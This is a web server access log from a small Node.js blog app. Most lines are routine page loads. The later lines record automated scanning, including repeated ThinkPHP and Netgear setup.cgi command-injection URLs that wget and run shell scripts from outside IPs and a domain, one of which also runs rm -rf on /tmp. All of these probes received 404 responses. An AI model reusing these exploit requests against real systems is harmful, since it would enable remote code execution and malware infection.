
> blogger@0.0.0 start /home/bitnami/blogger
> node ./bin/www

[0mGET / [32m200 [0m12.056 ms - 2072[0m
[0mGET /blog [32m200 [0m1.840 ms - 1906[0m
[0mGET /blog/addBlog [32m200 [0m1.213 ms - 1861[0m
[0mGET /stylesheets/style.css [36m304 [0m1.384 ms - -[0m
[0mGET /blog/addBlog [36m304 [0m1.031 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.389 ms - -[0m
[0mGET /blog [36m304 [0m1.023 ms - -[0m
[0mGET / [36m304 [0m1.065 ms - -[0m
[0mGET /blog [36m304 [0m0.820 ms - -[0m
[0mGET / [36m304 [0m0.795 ms - -[0m
[0mGET /blog/addBlog [36m304 [0m0.790 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.329 ms - -[0m
[0mGET /blog [36m304 [0m0.785 ms - -[0m
[0mGET / [36m304 [0m0.817 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.309 ms - -[0m
[0mGET /blog [36m304 [0m0.788 ms - -[0m
[0mGET /blog/addBlog [36m304 [0m0.755 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.305 ms - -[0m
[0mGET /blog [36m304 [0m0.839 ms - -[0m
[0mGET /blog/addBlog [36m304 [0m0.768 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.325 ms - -[0m
[0mGET /blog [36m304 [0m0.830 ms - -[0m
[0mGET /blog/addBlog [36m304 [0m0.783 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.320 ms - -[0m
[0mGET /blog/addBlog [36m304 [0m0.761 ms - -[0m
[0mGET /stylesheets/style.css [32m200 [0m2.560 ms - 111[0m
[0mGET / [36m304 [0m0.813 ms - -[0m
[0mGET /blog [36m304 [0m0.762 ms - -[0m
[0mGET /blog/addBlog [36m304 [0m0.748 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.296 ms - -[0m
[0mGET / [36m304 [0m0.771 ms - -[0m
[0mGET / [32m200 [0m1.074 ms - 2149[0m
[0mGET /blog [32m200 [0m1.043 ms - 1982[0m
[0mGET /blog/blog-add [33m404 [0m1.380 ms - 913[0m
[0mGET /blog [32m200 [0m1.042 ms - 1982[0m
[0mGET /blog [36m304 [0m0.856 ms - -[0m
[0mGET /blog/blog-add [33m404 [0m0.976 ms - 913[0m
[0mGET / [32m200 [0m1.049 ms - 2149[0m
[0mGET /blog [36m304 [0m0.750 ms - -[0m
[0mGET /blog/blog-add [33m404 [0m0.684 ms - 913[0m
[0mGET /blog/blog-add [33m404 [0m0.716 ms - 913[0m
[0mGET /blog [36m304 [0m0.781 ms - -[0m
[0mGET / [36m304 [0m0.773 ms - -[0m
[0mGET /blog [36m304 [0m0.751 ms - -[0m
[0mGET / [36m304 [0m0.748 ms - -[0m
[0mGET /blog [36m304 [0m1.867 ms - -[0m
[0mGET / [36m304 [0m0.789 ms - -[0m
[0mGET /blog/blog-add [33m404 [0m0.764 ms - 913[0m
[0mGET / [32m200 [0m1.015 ms - 2148[0m
[0mGET /blog [32m200 [0m1.087 ms - 1981[0m
[0mGET /blog/addBlog [32m200 [0m1.022 ms - 1936[0m
[0mGET /stylesheets/style.css [36m304 [0m0.307 ms - -[0m
[0mGET /blog/addBlog [36m304 [0m1.049 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.302 ms - -[0m
[0mGET /blog [36m304 [0m1.003 ms - -[0m
[0mGET / [36m304 [0m1.044 ms - -[0m
[0mGET /blog [36m304 [0m0.800 ms - -[0m
[0mGET /blog/addBlog [36m304 [0m0.781 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.282 ms - -[0m
[0mGET /blog/addBlog [36m304 [0m1.194 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.558 ms - -[0m
[0mGET /blog [36m304 [0m1.418 ms - -[0m
[0mGET /blog/addBlog [36m304 [0m1.039 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.382 ms - -[0m
[0mGET /blog [36m304 [0m0.824 ms - -[0m
[0mGET / [36m304 [0m0.880 ms - -[0m
[0mGET /blog/addBlog [36m304 [0m0.818 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.329 ms - -[0m
[0mGET /blog/blog-add [33m404 [0m1.444 ms - 913[0m
[0mGET / [32m200 [0m1.219 ms - 2148[0m
[0mGET /blog [32m200 [0m0.978 ms - 1981[0m
[0mGET /blog/addBlog [32m200 [0m0.816 ms - 1936[0m
[0mGET /stylesheets/style.css [32m200 [0m0.767 ms - 111[0m
[0mGET /blog/addBlog [36m304 [0m0.845 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.352 ms - -[0m
[0mGET /blog/addBlog [32m200 [0m1.050 ms - 1948[0m
[0mGET /blog [36m304 [0m0.833 ms - -[0m
[0mGET /blog/addBlog [36m304 [0m1.037 ms - -[0m
[0mGET /blog [36m304 [0m0.791 ms - -[0m
[0mGET / [36m304 [0m0.838 ms - -[0m
[0mGET / [36m304 [0m1.392 ms - -[0m
[0mGET / [36m304 [0m0.834 ms - -[0m
[0mGET /blog [36m304 [0m0.799 ms - -[0m
[0mGET /blog/addBlog [36m304 [0m0.801 ms - -[0m
[0mGET / [36m304 [0m0.803 ms - -[0m
[0mGET /blog [36m304 [0m0.809 ms - -[0m
[0mGET /blog/addBlog [36m304 [0m0.826 ms - -[0m
[0mGET /blog [36m304 [0m0.799 ms - -[0m
[0mGET / [36m304 [0m0.842 ms - -[0m
[0mGET /blog [36m304 [0m0.801 ms - -[0m
[0mGET /blog/addBlog [36m304 [0m0.777 ms - -[0m
[0mGET /blog [36m304 [0m0.793 ms - -[0m
[0mGET / [36m304 [0m0.737 ms - -[0m
[0mGET /blog [36m304 [0m0.793 ms - -[0m
[0mGET /blog/addBlog [36m304 [0m0.773 ms - -[0m
[0mGET /blog [36m304 [0m0.800 ms - -[0m
[0mGET / [36m304 [0m0.806 ms - -[0m
[0mGET /blog [36m304 [0m0.801 ms - -[0m
[0mGET /blog/addBlog [36m304 [0m0.799 ms - -[0m
[0mGET /blog [36m304 [0m0.806 ms - -[0m
[0mGET / [36m304 [0m0.797 ms - -[0m
[0mGET /blog [36m304 [0m0.821 ms - -[0m
[0mGET / [36m304 [0m0.796 ms - -[0m
[0mGET /blog [36m304 [0m0.807 ms - -[0m
[0mGET /blog/addBlog [36m304 [0m0.787 ms - -[0m
[0mGET /blog [36m304 [0m2.613 ms - -[0m
[0mGET / [36m304 [0m1.124 ms - -[0m
[0mGET /blog [36m304 [0m0.729 ms - -[0m
[0mGET /blog/addBlog [36m304 [0m0.764 ms - -[0m
[0mGET /blog [36m304 [0m0.785 ms - -[0m
[0mGET / [36m304 [0m0.789 ms - -[0m
[0mGET / [32m200 [0m0.789 ms - 2148[0m
[0mGET /favicon.ico [33m404 [0m0.999 ms - 913[0m
[0mGET / [32m200 [0m0.808 ms - 2148[0m
[0mGET /apple-touch-icon-precomposed.png [33m404 [0m0.783 ms - 913[0m
[0mGET /apple-touch-icon.png [33m404 [0m0.759 ms - 913[0m
[0mGET /favicon.ico [33m404 [0m0.731 ms - 913[0m
[0mGET / [32m200 [0m1.250 ms - 2148[0m
[0mGET /favicon.ico [33m404 [0m0.742 ms - 913[0m
[0mGET / [32m200 [0m0.788 ms - 2148[0m
[0mGET /favicon.ico [33m404 [0m0.752 ms - 913[0m
[0mGET / [32m200 [0m0.784 ms - 2148[0m
[0mGET / [32m200 [0m0.786 ms - 2148[0m
[0mGET / [32m200 [0m0.849 ms - 2148[0m
[0mGET / [32m200 [0m1.305 ms - 2148[0m
[0mGET / [32m200 [0m0.828 ms - 2148[0m
[0mGET / [32m200 [0m0.841 ms - 2148[0m
[0mGET / [32m200 [0m0.828 ms - 2148[0m
[0mGET / [32m200 [0m0.791 ms - 2148[0m
[0mGET / [32m200 [0m1.248 ms - 2148[0m
[0mGET / [32m200 [0m0.785 ms - 2148[0m
[0mGET / [32m200 [0m0.773 ms - 2148[0m
[0mGET / [32m200 [0m0.770 ms - 2148[0m
[0mGET / [32m200 [0m0.766 ms - 2148[0m
[0mGET / [32m200 [0m0.760 ms - 2148[0m
[0mGET /moo [33m404 [0m1.784 ms - 913[0m
[0mGET / [32m200 [0m0.908 ms - 2148[0m
[0mGET / [32m200 [0m0.790 ms - 2148[0m
[0mGET / [32m200 [0m0.742 ms - 2148[0m
[0mGET / [32m200 [0m0.795 ms - 2148[0m
[0mGET / [32m200 [0m0.774 ms - 2148[0m
[0mGET / [32m200 [0m0.760 ms - 2148[0m
[0mGET /favicon.ico [33m404 [0m0.731 ms - 913[0m
[0mGET / [32m200 [0m0.767 ms - 2148[0m
[0mGET / [32m200 [0m0.722 ms - 2148[0m
[0mGET / [32m200 [0m0.823 ms - 2148[0m
[0mGET / [32m200 [0m0.765 ms - 2148[0m
[0mGET / [32m200 [0m0.776 ms - 2148[0m
[0mGET / [32m200 [0m0.843 ms - 2148[0m
[0mGET /v1/agent/self [33m404 [0m0.751 ms - 913[0m
[0mGET / [32m200 [0m0.756 ms - 2148[0m
[0mGET / [32m200 [0m0.778 ms - 2148[0m
[0mGET / [32m200 [0m0.802 ms - 2148[0m
[0mGET / [32m200 [0m0.704 ms - 2148[0m
[0mGET / [32m200 [0m0.604 ms - 2148[0m
[0mGET / [32m200 [0m0.795 ms - 2148[0m
[0mGET / [32m200 [0m0.749 ms - 2148[0m
[0mGET / [32m200 [0m0.759 ms - 2148[0m
[0mGET / [32m200 [0m0.792 ms - 2148[0m
[0mGET / [32m200 [0m0.817 ms - 2148[0m
[0mGET / [32m200 [0m0.774 ms - 2148[0m
[0mGET /favicon.ico [33m404 [0m0.724 ms - 913[0m
[0mGET /blog [32m200 [0m1.822 ms - 1981[0m
[0mGET /blog/addBlog [32m200 [0m1.403 ms - 1948[0m
[0mGET /blog [36m304 [0m6.943 ms - -[0m
[0mGET / [36m304 [0m1.188 ms - -[0m
[0mGET / [32m200 [0m0.821 ms - 2148[0m
[0mGET / [32m200 [0m1.962 ms - 2148[0m
[0mGET / [32m200 [0m0.778 ms - 2148[0m
[0mGET / [32m200 [0m0.797 ms - 2148[0m
[0mGET / [32m200 [0m0.593 ms - 2148[0m
[0mGET / [32m200 [0m0.752 ms - 2148[0m
[0mGET / [32m200 [0m0.716 ms - 2148[0m
[0mGET / [32m200 [0m0.819 ms - 2148[0m
[0mGET / [32m200 [0m0.771 ms - 2148[0m
[0mGET / [32m200 [0m0.786 ms - 2148[0m
[0mGET / [32m200 [0m4.130 ms - 2148[0m
[0mGET / [32m200 [0m0.815 ms - 2148[0m
[0mGET / [32m200 [0m0.759 ms - 2148[0m
[0mGET / [32m200 [0m3.699 ms - 2148[0m
[0mGET / [32m200 [0m0.765 ms - 2148[0m
[0mGET / [32m200 [0m0.792 ms - 2148[0m
[0mGET / [32m200 [0m0.609 ms - 2148[0m
[0mGET / [32m200 [0m0.748 ms - 2148[0m
[0mGET / [32m200 [0m0.713 ms - 2148[0m
[0mGET / [36m304 [0m0.802 ms - -[0m
[0mGET /favicon.ico [33m404 [0m12.511 ms - 913[0m
[0mGET / [32m200 [0m0.767 ms - 2148[0m
[0mGET /robots.txt [33m404 [0m1.100 ms - 913[0m
[0mGET /sitemap.xml [33m404 [0m0.708 ms - 913[0m
[0mGET /.well-known/security.txt [33m404 [0m2.611 ms - 913[0m
[0mGET /favicon.ico [33m404 [0m0.688 ms - 913[0m
[0mGET / [32m200 [0m0.740 ms - 2148[0m
[0mGET / [32m200 [0m0.788 ms - 2148[0m
[0mGET / [32m200 [0m0.767 ms - 2148[0m
[0mGET /mysql/admin/index.php?lang=en [33m404 [0m0.720 ms - 913[0m
[0mGET / [32m200 [0m27.270 ms - 2148[0m
[0mGET / [32m200 [0m0.823 ms - 2148[0m
[0mGET / [32m200 [0m0.739 ms - 2148[0m
[0mGET / [32m200 [0m0.813 ms - 2148[0m
[0mGET / [32m200 [0m6.475 ms - 2148[0m
[0mGET /acadmin.php [33m404 [0m8.900 ms - 913[0m
[0mGET / [32m200 [0m0.754 ms - 2148[0m
[0mGET / [32m200 [0m0.752 ms - 2148[0m
[0mGET / [32m200 [0m0.687 ms - 2148[0m
[0mGET / [32m200 [0m23.180 ms - 2148[0m
[0mGET / [32m200 [0m0.807 ms - 2148[0m
[0mGET / [32m200 [0m0.752 ms - 2148[0m
[0mGET / [32m200 [0m2.547 ms - 2148[0m
[0mGET / [32m200 [0m0.750 ms - 2148[0m
[0mGET / [32m200 [0m0.767 ms - 2148[0m
[0mGET / [32m200 [0m0.760 ms - 2148[0m
[0mGET / [32m200 [0m1.180 ms - 2148[0m
[0mGET / [32m200 [0m0.723 ms - 2148[0m
[0mGET / [32m200 [0m0.762 ms - 2148[0m
[0mGET / [32m200 [0m0.798 ms - 2148[0m
[0mGET / [32m200 [0m0.750 ms - 2148[0m
[0mGET /7E7DAC0EE02BA994E9618802E09A2022.php [33m404 [0m0.727 ms - 913[0m
[0mGET / [32m200 [0m5.356 ms - 2148[0m
[0mGET / [32m200 [0m0.738 ms - 2148[0m
[0mGET / [32m200 [0m0.796 ms - 2148[0m
[0mGET / [32m200 [0m0.753 ms - 2148[0m
[0mGET / [32m200 [0m0.755 ms - 2148[0m
[0mGET / [32m200 [0m0.810 ms - 2148[0m
[0mGET /setup.cgi?next_file=afr.cfg&todo=syscmd&cmd=wget%20http://159.89.228.151/mips%20-O%20/var/tmp/mips;%20chmod%20777%20/var/tmp/mips;%20/var/tmp/mips;%20rm%20-rf%20/var/tmp/mips&curpath=/&currentsetting.htm=1 [33m404 [0m0.700 ms - 913[0m
[0mGET /mysql/admin/index.php?lang=en [33m404 [0m0.688 ms - 913[0m
[0mGET / [32m200 [0m0.712 ms - 2148[0m
[0mGET / [32m200 [0m0.856 ms - 2148[0m
[0mGET / [32m200 [0m0.700 ms - 2148[0m
[0mGET / [32m200 [0m1.717 ms - 2148[0m
[0mGET / [32m200 [0m0.769 ms - 2148[0m
[0mGET / [32m200 [0m0.761 ms - 2148[0m
[0mGET /v1/agent/self [33m404 [0m1.806 ms - 913[0m
[0mGET / [32m200 [0m0.755 ms - 2148[0m
[0mGET /TP/public/index.php [33m404 [0m1.305 ms - 913[0m
[0mGET /TP/index.php [33m404 [0m1.130 ms - 913[0m
[0mGET /thinkphp/html/public/index.php [33m404 [0m0.693 ms - 913[0m
[0mGET /html/public/index.php [33m404 [0m0.689 ms - 913[0m
[0mGET /public/index.php [33m404 [0m0.741 ms - 913[0m
[0mGET /TP/html/public/index.php [33m404 [0m0.661 ms - 913[0m
[0mGET /elrekt.php [33m404 [0m0.679 ms - 913[0m
[0mGET /index.php [33m404 [0m0.734 ms - 913[0m
[0mGET / [32m200 [0m0.763 ms - 2148[0m
[0mGET / [32m200 [0m0.724 ms - 2148[0m
[0mGET / [32m200 [0m0.678 ms - 2148[0m
[0mGET / [32m200 [0m0.730 ms - 2148[0m
[0mGET / [32m200 [0m0.753 ms - 2148[0m
[0mGET / [32m200 [0m0.662 ms - 2148[0m
[0mGET / [32m200 [0m1.146 ms - 2148[0m
[0mGET / [32m200 [0m0.790 ms - 2148[0m
[0mGET / [32m200 [0m0.742 ms - 2148[0m
[0mGET / [32m200 [0m0.836 ms - 2148[0m
[0mGET / [32m200 [0m0.696 ms - 2148[0m
[0mGET / [32m200 [0m1.651 ms - 2148[0m
[0mGET / [32m200 [0m0.759 ms - 2148[0m
[0mGET / [32m200 [0m0.720 ms - 2148[0m
[0mGET / [32m200 [0m0.758 ms - 2148[0m
[0mHEAD / [32m200 [0m1.262 ms - 2148[0m
[0mGET / [32m200 [0m0.768 ms - 2148[0m
[0mGET / [32m200 [0m0.729 ms - 2148[0m
[0mGET / [32m200 [0m1.198 ms - 2148[0m
[0mGET / [32m200 [0m0.693 ms - 2148[0m
[0mGET / [32m200 [0m0.748 ms - 2148[0m
[0mGET / [32m200 [0m0.723 ms - 2148[0m
[0mGET / [32m200 [0m0.752 ms - 2148[0m
[0mGET / [32m200 [0m0.760 ms - 2148[0m
[0mHEAD http://112.124.42.80:63435/ [32m200 [0m0.883 ms - 2148[0m
[0mGET / [32m200 [0m0.751 ms - 2148[0m
[0mGET / [32m200 [0m0.800 ms - 2148[0m
[0mGET / [32m200 [0m0.565 ms - 2148[0m
[0mGET / [32m200 [0m0.712 ms - 2148[0m
[0mGET / [32m200 [0m0.828 ms - 2148[0m
[0mGET / [32m200 [0m1.121 ms - 2148[0m
[0mGET / [32m200 [0m0.797 ms - 2148[0m
[0mHEAD /robots.txt [33m404 [0m9.261 ms - 913[0m
[0mGET / [32m200 [0m0.767 ms - 2148[0m
[0mGET / [32m200 [0m0.713 ms - 2148[0m
[0mGET /mysql/admin/index.php?lang=en [33m404 [0m0.707 ms - 913[0m
[0mGET / [32m200 [0m0.789 ms - 2148[0m
[0mGET / [32m200 [0m0.571 ms - 2148[0m
[0mGET / [32m200 [0m0.771 ms - 2148[0m
[0mGET / [32m200 [0m0.795 ms - 2148[0m
[0mGET / [32m200 [0m0.755 ms - 2148[0m
[0mGET / [32m200 [0m0.729 ms - 2148[0m
[0mGET / [32m200 [0m1.024 ms - 2148[0m
[0mGET / [32m200 [0m0.749 ms - 2148[0m
[0mGET / [32m200 [0m0.766 ms - 2148[0m
[0mGET / [32m200 [0m0.714 ms - 2148[0m
[0mGET / [32m200 [0m0.765 ms - 2148[0m
[0mGET / [32m200 [0m0.769 ms - 2148[0m
[0mGET / [32m200 [0m2.908 ms - 2148[0m
[0mGET / [32m200 [0m0.732 ms - 2148[0m
[0mGET /CHANGELOG.txt [33m404 [0m1.183 ms - 913[0m
[0mGET / [32m200 [0m0.739 ms - 2148[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.755 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.667 ms - 913[0m
[0mGET / [32m200 [0m1.056 ms - 2148[0m
[0mGET / [32m200 [0m0.688 ms - 2148[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.828 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.537 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.542 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.496 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.553 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.513 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.651 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m24.808 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m2.092 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m4.083 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m4.298 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m4.675 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m4.978 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m3.592 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m6.638 ms - 913[0m
[0mGET / [32m200 [0m0.782 ms - 2148[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.691 ms - 913[0m
[0mGET /mysql/admin/index.php?lang=en [33m404 [0m0.703 ms - 913[0m
[0mGET / [32m200 [0m0.729 ms - 2148[0m
[0mGET / [32m200 [0m0.751 ms - 2148[0m
[0mGET / [32m200 [0m0.731 ms - 2148[0m
[0mGET / [32m200 [0m0.713 ms - 2148[0m
[0mGET / [32m200 [0m0.694 ms - 2148[0m
[0mGET / [32m200 [0m0.525 ms - 2148[0m
[0mGET / [32m200 [0m0.724 ms - 2148[0m
[0mGET / [32m200 [0m0.816 ms - 2148[0m
[0mGET / [32m200 [0m0.788 ms - 2148[0m
[0mGET / [32m200 [0m0.727 ms - 2148[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.693 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.495 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.694 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.499 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.718 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.678 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.989 ms - 913[0m
[0mGET /admin/index.php [33m404 [0m0.713 ms - 913[0m
[0mGET / [32m200 [0m0.729 ms - 2148[0m
[0mGET /index.php [33m404 [0m0.722 ms - 913[0m
[0mGET /mailer/admin/index.php [33m404 [0m0.691 ms - 913[0m
[0mGET / [32m200 [0m0.796 ms - 2148[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.683 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.486 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.489 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.480 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m2.186 ms - 913[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://thotnet.pw/inf.sh+-O+/tmp/inf.sh;sh+inf.sh&curpath=/&currentsetting.htm=1 [33m404 [0m4.077 ms - 913[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://thotnet.pw/inf.sh+-O+/tmp/inf.sh;sh+inf.sh&curpath=/&currentsetting.htm=1 [33m404 [0m0.684 ms - 913[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://46.243.189.101/gang+-O+/tmp/gang;sh+gang&curpath=/&currentsetting.htm=1 [33m404 [0m0.671 ms - 913[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://46.243.189.101/gang+-O+/tmp/gang;sh+gang&curpath=/&currentsetting.htm=1 [33m404 [0m0.705 ms - 913[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://46.243.189.101/gang+-O+/tmp/gang;sh+gang&curpath=/&currentsetting.htm=1 [33m404 [0m0.649 ms - 913[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://46.243.189.101/gang+-O+/tmp/gang;sh+gang&curpath=/&currentsetting.htm=1 [33m404 [0m0.656 ms - 913[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://46.243.189.101/gang+-O+/tmp/gang;sh+gang&curpath=/&currentsetting.htm=1 [33m404 [0m0.664 ms - 913[0m
[0mGET / [32m200 [0m1.335 ms - 2148[0m
[0mGET / [32m200 [0m0.770 ms - 2148[0m
[0mGET /mysql/admin/index.php?lang=en [33m404 [0m0.704 ms - 913[0m
[0mGET / [32m200 [0m0.774 ms - 2148[0m
[0mGET / [32m200 [0m0.723 ms - 2148[0m
[0mGET / [32m200 [0m0.746 ms - 2148[0m
[0mGET /iem/index.php [33m404 [0m0.701 ms - 913[0m
[0mGET / [32m200 [0m0.786 ms - 2148[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.685 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.526 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.731 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m1.016 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.532 ms - 913[0m
